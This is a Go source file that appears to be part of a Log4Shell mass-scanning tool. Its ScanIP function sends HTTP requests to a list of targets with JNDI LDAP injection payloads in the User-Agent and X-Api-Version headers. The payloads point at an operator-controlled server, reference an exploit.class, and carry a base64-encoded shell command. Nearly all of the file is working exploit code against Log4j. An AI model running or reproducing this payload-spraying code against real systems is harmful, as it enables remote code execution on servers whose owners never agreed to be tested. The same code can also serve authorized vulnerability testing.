package cmd

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

func ScanIP(ipPortChan <-chan string, server_url string, wg *sync.WaitGroup) {
	client := &http.Client{
		Timeout: 250 * time.Millisecond,
		Transport: &http.Transport{
			TLSHandshakeTimeout:   1 * time.Second,
			ResponseHeaderTimeout: 1 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}

	for target_url := range ipPortChan {

		request, err := http.NewRequest("GET", target_url, nil)
		if err != nil {
			log.Fatal(err)
		}
		targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", server_url)
		targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", server_url)
		log.Debugf("Target URL: %s", target_url)
		log.Debugf("Target User-Agent: %s", targetUserAgent)
		log.Debugf("Target X-Api-Version: %s", targetHeader)
		request.Header.Set("User-Agent", targetUserAgent)
		request.Header.Add("X-Api-Version", targetHeader)
		response, err := client.Do(request)
		if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
			log.Debug(err)
		}
		if response != nil {
			log.Infof("%s ==> Status code: %d", target_url, response.StatusCode)
		}

		wg.Done()
	}
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
